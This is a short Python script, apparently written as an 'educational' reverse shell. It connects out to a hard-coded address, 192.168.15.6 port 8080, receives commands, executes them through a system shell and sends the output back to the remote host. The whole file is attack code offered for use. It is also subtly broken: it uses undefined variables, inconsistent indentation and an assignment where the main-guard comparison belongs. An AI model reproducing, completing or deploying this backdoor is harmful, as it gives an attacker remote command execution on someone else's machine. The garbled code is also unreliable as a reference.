#!/usr/bin/env python

#This program is made by Namouchi Zied
#This is for educational purpose only
#use it carefully

#importing the necessary modules
import socket
import sys
import os
import subprocess


IP = "192.168.15.6"
PORT = 8080

def connection():

	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect((IP, PORT)) 
		except Exception, e:
			print("[!] Connection couldn't be established")
		finally:
			while True:
				reveived_command = sock.recv(1024)
				if 'finshed' in reveived_command:
					sock.close()
					break
				else:
					command =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            		s.send( command.stdout.read()  ) # send back the result
            		s.send( command.stderr.read()  ) # send back the error -if any-, such as syntax error
		
	except socket.error , msg:
        print ('[!] Socket could not be created. Error Code : ')
		sys.exit()
	
def main():
	try:
		connection()
	except Exception, e:
		print("[!] A problem occured")
		sys.exit()

if __name__ = '__main__':
	main()
	
